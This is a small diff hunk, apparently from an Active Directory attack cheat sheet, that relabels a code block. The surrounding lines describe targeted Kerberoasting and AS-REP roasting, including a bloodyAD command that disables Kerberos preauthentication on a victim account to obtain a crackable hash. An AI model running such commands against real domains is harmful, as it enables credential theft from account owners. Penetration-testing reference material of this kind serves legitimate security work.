@@ -69,7 +69,7 @@ We can set a **SPN** on a target account, request a Service Ticket (ST), then gr
   ```
 * **We can change a victim's **userAccountControl** to not require Kerberos preauthentication, grab the user's crackable AS-REP, and then change the setting back.**  
 
-  ```powershell
+  ```bash
   # Modify the userAccountControl
   $ bloodyAD --host [DC IP] -d [DOMAIN] -u [AttackerUser] -p [MyPassword] add uac [Target_User] -f DONT_REQ_PREAUTH
 
